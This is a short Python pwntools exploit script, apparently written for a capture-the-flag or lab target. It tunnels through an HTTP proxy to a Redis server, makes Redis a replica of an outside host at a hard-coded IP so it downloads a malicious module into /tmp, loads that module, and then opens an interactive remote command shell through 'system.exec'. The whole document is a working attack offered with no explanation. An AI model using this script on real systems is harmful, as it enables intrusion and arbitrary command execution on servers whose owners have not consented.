from pwn import *
from time import sleep

context.log_level = 'debug'

CLRF = '\r\n'

def mk_cmd_arr(arr):
    cmd = ""
    cmd += "*" + str(len(arr))
    for arg in arr:
        cmd += CLRF + "$" + str(len(arg))
        cmd += CLRF + arg
    cmd += CLRF
    return cmd

r = remote('127.0.0.1', 8080)
sleep(2)

r.send('CONNECT 0.0.0.0:6379 HTTP/1.1' + CLRF + CLRF)
r.recv()
r.send('SLAVEOF 52.9.86.42 8888' + CLRF)
r.send('CONFIG SET dir /tmp/' + CLRF)
r.send('CONFIG SET dbfilename lin_exp.so' + CLRF)
input('Waiting for server to update values, press enter once done...')
r.send('MODULE LOAD /tmp/lin_exp.so' + CLRF)
r.send('SLAVEOF NO ONE' + CLRF)

print('[*] All client requests sent')

while True:
    cmd = input('$ ')
    cmd = cmd.strip()
    r.send(mk_cmd_arr(['system.exec', cmd]))
    r.recv()
